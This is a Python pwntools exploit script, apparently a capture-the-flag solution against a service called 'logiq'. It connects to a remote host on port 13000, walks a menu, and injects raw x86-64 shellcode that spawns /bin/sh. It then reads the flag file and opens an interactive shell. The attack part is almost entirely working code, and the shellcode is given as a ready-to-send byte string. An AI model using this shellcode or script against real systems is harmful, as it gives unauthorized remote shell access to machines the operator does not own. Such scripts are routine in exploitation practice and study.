#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# exe = context.binary = ELF(args.EXE or './logiq_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc host port'.split()

# libc_path = ''
# ld_path = ''
# libc = ELF(libc_path) if libc_path else exe.libc
# ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
            
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

# def start_local(argv=[], *a, **kw):
#     '''Execute the target binary locally'''
#     kw['env'] = {"SHELL": "/bin/sh"}
#     if args.GDB:
#         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
#     else:
#         return process([exe.path] + argv, *a, **kw)

# def start_remote(argv=[], *a, **kw):
#     '''Connect to the process on the remote host'''
#     io = connect(host, port)
#     if args.GDB:
#         gdb.attach(io, gdbscript=gdbscript)
#     return io

# def start(argv=[], *a, **kw):
#     if args.LOCAL or args.LOCAL_LIBC:
#         return start_local(argv, *a, **kw)
#     else:
#         return start_remote(argv, *a, **kw)

# def ua(x):
#     return int.from_bytes(x, 'little')
    

gdbscript = '''
b *(execute_custom_logic+630)
continue
'''.format(**locals())


p = remote(sys.argv[1], '13000')
p.sendline(b'5')
p.sendline(b'yes')
# res = asm(shc) 
# print(res)
p.send(b'L\x8b\x04$I\x81\xc0J\xfd\xff\xffH1\xf6VH\xbf.bin//shH\xff\xc7WT_j;X\x99A\xff\xe0')
sleep(1)
p.sendline(b'cat /flag*')

a = p.recvall(1)
print(a, flush=True)
p.interactive()
